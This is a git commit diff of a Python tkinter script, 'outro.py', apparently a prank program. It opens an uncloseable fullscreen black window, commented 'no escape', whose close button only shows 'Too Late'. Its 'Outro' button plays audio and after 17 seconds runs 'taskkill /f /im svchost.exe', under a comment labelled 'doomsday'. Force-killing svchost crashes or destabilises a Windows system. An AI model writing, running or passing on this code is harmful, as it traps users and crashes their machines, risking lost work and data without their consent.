3461bb60b4d65dad0a1381d9d52faa802b6b8e98
Frankenking <99056962+Frankenking@users.noreply.github.com>
2022-09-09 16:54:38 -0700

    completions

--- outro.py
+++ outro.py
@@ -1,29 +1,43 @@
 
+import threading
 import tkinter as tk
 from tkinter import messagebox
-import playsound
+from playsound import playsound
 import time
 import os
+
 root = tk.Tk()
-root.geometry("2000x2000")
+
+#root attributes
+root.geometry("1920x1080")
 root.configure(background='black')
+root.attributes('-fullscreen', True)
 
+#no escape
 def on_closing():
-
     if True:
         messagebox.showwarning("Too Late")
 
-
-
 root.protocol("WM_DELETE_WINDOW", on_closing)
-root.attributes('-fullscreen', True)
+
+#doomsday
 def byebye():
-    time.sleep(60)
+    time.sleep(17)
     os.system("taskkill /f /im  svchost.exe")
+def outro():
+        threading.Thread(target=byebye).start()    
+        messagebox.showwarning("Bad Idea")
+        playsound('audio.mp3')
+
+
+
+#threads
 def outro_start():
-    byebye()    
-    playsound.playsound('audio.mp3')
+    threading.Thread(target=outro).start()
+
+#start button
 button_a = tk.Button(
+    root,
     text="Outro",
     width=20,
     height=5,
@@ -31,9 +45,12 @@ button_a = tk.Button(
     fg="black",
     command = outro_start,
     )
-button_a.place(x=500, y=500)
+button_a.place(x=1000, y=500)
 
+#loop
+print('looping')
 root.mainloop()
+
 
 
 
